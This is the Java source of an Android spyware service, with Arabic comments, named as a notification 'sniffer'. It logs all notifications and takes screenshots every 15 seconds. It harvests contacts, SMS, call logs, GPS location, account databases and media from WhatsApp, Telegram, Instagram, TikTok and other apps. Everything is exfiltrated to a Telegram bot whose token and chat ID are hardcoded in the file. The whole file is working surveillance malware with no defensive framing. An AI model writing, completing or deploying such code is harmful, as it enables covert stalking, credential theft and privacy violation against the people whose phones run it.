package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.media.MediaScannerConnection;
import android.os.Environment;
import android.util.Log;

import okhttp3.*;
import java.io.*;
import java.util.*;
import java.text.SimpleDateFormat;

public class NotificationService extends NotificationListenerService {

    // ⚠️ ضع معلوماتك هنا ⚠️
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());
    
    // للإشعارات
    private Set<String> sentNotifications = new HashSet<>();
    private int notificationCount = 0;
    
    // للقطات الشاشة
    private int screenshotCount = 0;
    
    // للحسابات
    private Map<String, Long> accountFileSizes = new HashMap<>();
    
    // مسارات التطبيقات المهمة
    private final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.facebook.katana", "com.snapchat.android", "com.twitter.android",
        "com.google.android.gm", "com.android.mms", "com.google.android.apps.messaging"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        startAllServices();
    }

    private void startAllServices() {
        // بدء جميع الخدمات
        handler.postDelayed(screenshotRunnable, 15000); // كل 15 ثانية
        handler.postDelayed(accountRunnable, 5000);     // كل 5 ثواني
        handler.postDelayed(personalDataRunnable, 300000); // كل 5 دقائق
        handler.postDelayed(appsDataRunnable, 900000);  // كل 15 دقيقة
        handler.postDelayed(reportRunnable, 3600000);   // كل ساعة
        
        sendToTelegram("✅ V13 نشط", "السحب التلقائي شغال");
        grabInitialData();
    }

    private void grabInitialData() {
        // سحب البيانات الأولية
        new Thread(() -> {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            grabAllAppsData();
        }).start();
    }

    // ========== 1. نظام الإشعارات ==========
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            // تجاهل إشعارات النظام
            if (sbn.getPackageName().equals("android")) return;

            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            Object textObj = extras.get(Notification.EXTRA_TEXT);
            String text = (textObj != null) ? textObj.toString() : "";
            String appName = sbn.getPackageName();
            String appLabel = getAppName(appName);

            // تجاهل الإشعارات الفارغة
            if (title.length() < 2 && text.length() < 2) return;

            // تجنب التكرار
            String notifId = appName + "|" + title + "|" + text;
            if (sentNotifications.contains(notifId)) return;
            
            sentNotifications.add(notifId);
            if (sentNotifications.size() > 200) {
                sentNotifications.remove(sentNotifications.iterator().next());
            }

            notificationCount++;

            String message = "🔔 إشعار #" + notificationCount + "\n" +
                           "📱 التطبيق: " + appLabel + "\n";
            if (!title.isEmpty()) message += "👤 " + title + "\n";
            if (!text.isEmpty()) message += "💬 " + text;

            sendToTelegram("إشعار جديد", message);

            // إذا كان الإشعار من تطبيق مهم، نأخذ لقطة شاشة
            if (isImportantApp(appName)) {
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }

        } catch (Exception e) {
            Log.e("V8", "Notification error", e);
        }
    }

    private String getAppName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private boolean isImportantApp(String packageName) {
        for (String app : TARGET_APPS) {
            if (packageName.contains(app)) return true;
        }
        return false;
    }

    // ========== 2. نظام لقطات الشاشة ==========
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            takeScreenshot();
            handler.postDelayed(this, 15000); // كل 15 ثانية
        }
    };

    private void takeScreenshot() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + timeStamp + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            
            File file = new File(path);
            if (file.exists() && file.length() > 1000) {
                screenshotCount++;
                sendFileToTelegram("📸 لقطة #" + screenshotCount, file.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e("V8", "Screenshot error", e);
        }
    }

    // ========== 3. نظام مراقبة الحسابات ==========
    private Runnable accountRunnable = new Runnable() {
        @Override
        public void run() {
            checkNewAccounts();
            handler.postDelayed(this, 5000); // كل 5 ثواني
        }
    };

    private void checkNewAccounts() {
        try {
            // مسارات ملفات الحسابات
            String[] accountPaths = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.google.android.gms/databases/accounts.db",
                "/data/data/com.whatsapp/shared_prefs/WhatsApp.xml",
                "/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml",
                "/data/data/com.facebook.orca/shared_prefs",
                "/data/data/com.instagram.android/shared_prefs",
                "/data/data/com.zhiliaoapp.musically/shared_prefs"
            };

            List<String> newAccounts = new ArrayList<>();

            for (String path : accountPaths) {
                File file = new File(path);
                if (file.exists()) {
                    long currentSize = file.length();
                    String key = path + "_" + currentSize;

                    if (accountFileSizes.containsKey(path)) {
                        long oldSize = accountFileSizes.get(path);
                        if (currentSize != oldSize) {
                            newAccounts.add("📁 تغير في " + getAppNameFromPath(path));
                            
                            if (currentSize < 10 * 1024 * 1024) {
                                String tempPath = Environment.getExternalStorageDirectory() + "/Download/account_" + System.currentTimeMillis() + ".dat";
                                copyFile(file, new File(tempPath));
                                sendFileToTelegram("🔐 ملف " + getAppNameFromPath(path), tempPath);
                            }
                        }
                    }
                    accountFileSizes.put(path, currentSize);
                }
            }

            if (!newAccounts.isEmpty()) {
                StringBuilder msg = new StringBuilder();
                for (String acc : newAccounts) {
                    msg.append(acc).append("\n");
                }
                sendToTelegram("🔐 حسابات جديدة (" + newAccounts.size() + ")", msg.toString());
                
                // لقطة شاشة بعد حساب جديد
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }

        } catch (Exception e) {
            Log.e("V8", "Account check error", e);
        }
    }

    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "واتساب";
        if (path.contains("telegram")) return "تيليغرام";
        if (path.contains("facebook")) return "فيسبوك";
        if (path.contains("instagram")) return "انستغرام";
        if (path.contains("musically")) return "تيك توك";
        if (path.contains("google")) return "جوجل";
        return "تطبيق";
    }

    // ========== 4. نظام سحب البيانات الشخصية ==========
    private Runnable personalDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            handler.postDelayed(this, 300000); // كل 5 دقائق
        }
    };

    private void grabAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                StringBuilder contacts = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();

                if (contacts.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/contacts_" + System.currentTimeMillis() + ".txt";
                    writeToFile(contacts.toString(), path);
                    sendFileToTelegram("👥 جهات الاتصال", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Contacts error", e);
        }
    }

    private void grabAllSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 100");

            if (cursor != null) {
                StringBuilder sms = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    sms.append("من: ").append(address).append("\n");
                    sms.append("نص: ").append(body).append("\n");
                    sms.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();

                if (sms.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/sms_" + System.currentTimeMillis() + ".txt";
                    writeToFile(sms.toString(), path);
                    sendFileToTelegram("📨 الرسائل", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "SMS error", e);
        }
    }

    private void grabAllCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");

            if (cursor != null) {
                StringBuilder calls = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    if ("3".equals(type)) typeStr = "فائت";
                    
                    calls.append("رقم: ").append(number).append("\n");
                    calls.append("نوع: ").append(typeStr).append("\n");
                    calls.append("مدة: ").append(duration).append(" ثانية\n");
                    calls.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();

                if (calls.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/calls_" + System.currentTimeMillis() + ".txt";
                    writeToFile(calls.toString(), path);
                    sendFileToTelegram("📞 سجل المكالمات", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Calls error", e);
        }
    }

    private void grabLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                String loc = "الموقع الحالي:\n";
                loc += "خط العرض: " + location.getLatitude() + "\n";
                loc += "خط الطول: " + location.getLongitude() + "\n";
                loc += "الدقة: " + location.getAccuracy() + " متر";
                sendToTelegram("📍 الموقع", loc);
            }
        } catch (Exception e) {
            Log.e("V8", "Location error", e);
        }
    }

    // ========== 5. نظام سحب بيانات التطبيقات ==========
    private Runnable appsDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllAppsData();
            handler.postDelayed(this, 900000); // كل 15 دقيقة
        }
    };

    private void grabAllAppsData() {
        // تيك توك
        grabAppData("com.zhiliaoapp.musically", "تيك توك", new String[]{".mp4", ".jpg"});
        grabAppData("com.ss.android.ugc.trill", "تيك توك", new String[]{".mp4", ".jpg"});
        
        // مسنجر
        grabAppData("com.facebook.orca", "مسنجر", new String[]{".jpg", ".png", ".mp4"});
        
        // واتساب
        grabWhatsAppData();
        
        // تليغرام
        grabAppData("org.telegram.messenger", "تيليغرام", new String[]{".jpg", ".mp4", ".pdf"});
        
        // انستغرام
        grabAppData("com.instagram.android", "انستغرام", new String[]{".jpg", ".mp4"});
    }

    private void grabAppData(String packageName, String appName, String[] extensions) {
        try {
            String[] paths = {
                "/data/data/" + packageName + "/files",
                "/data/data/" + packageName + "/cache",
                Environment.getExternalStorageDirectory() + "/Android/data/" + packageName + "/files"
            };

            List<String> files = new ArrayList<>();

            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                for (String ext : extensions) {
                                    if (file.getName().endsWith(ext)) {
                                        files.add(file.getAbsolutePath());
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (!files.isEmpty()) {
                sendToTelegram("📱 " + appName, "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram(appName, files.get(i));
                }
            }

        } catch (Exception e) {
            Log.e("V8", "App data error", e);
        }
    }

    private void grabWhatsAppData() {
        try {
            String[] paths = {
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Databases"
            };

            List<String> files = new ArrayList<>();

            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                files.add(file.getAbsolutePath());
                            }
                        }
                    }
                }
            }

            if (!files.isEmpty()) {
                sendToTelegram("📱 واتساب", "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram("واتساب", files.get(i));
                }
            }

        } catch (Exception e) {
            Log.e("V8", "WhatsApp error", e);
        }
    }

    // ========== 6. نظام التقارير ==========
    private Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            sendReport();
            handler.postDelayed(this, 3600000); // كل ساعة
        }
    };

    private void sendReport() {
        long hours = System.currentTimeMillis() / 3600000;
        String report = "📊 تقرير " + hours + " ساعة:\n" +
                       "📸 لقطات: " + screenshotCount + "\n" +
                       "🔔 إشعارات: " + notificationCount + "\n" +
                       "🔐 ملفات مراقبة: " + accountFileSizes.size();
        sendToTelegram("📊 تقرير دوري", report);
    }

    // ========== أدوات مساعدة ==========
    private void writeToFile(String content, String path) {
        try {
            FileWriter writer = new FileWriter(path);
            writer.write(content);
            writer.close();
        } catch (Exception e) {
            Log.e("V8", "Write error", e);
        }
    }

    private void copyFile(File src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();
        } catch (Exception e) {
            Log.e("V8", "Copy error", e);
        }
    }

    private void sendToTelegram(String title, String message) {
        try {
            String fullMessage = "🔴 V13\n📌 " + title + "\n\n" + message;
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(fullMessage);
            
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close(); 
                }
            });
        } catch (Exception e) {
            Log.e("V8", "Send error", e);
        }
    }

    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;

            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "🔴 " + caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();

            Request request = new Request.Builder().url(url).post(requestBody).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close();
                    file.delete();
                }
            });

        } catch (Exception e) {
            Log.e("V8", "Send file error", e);
        }
    }
          }
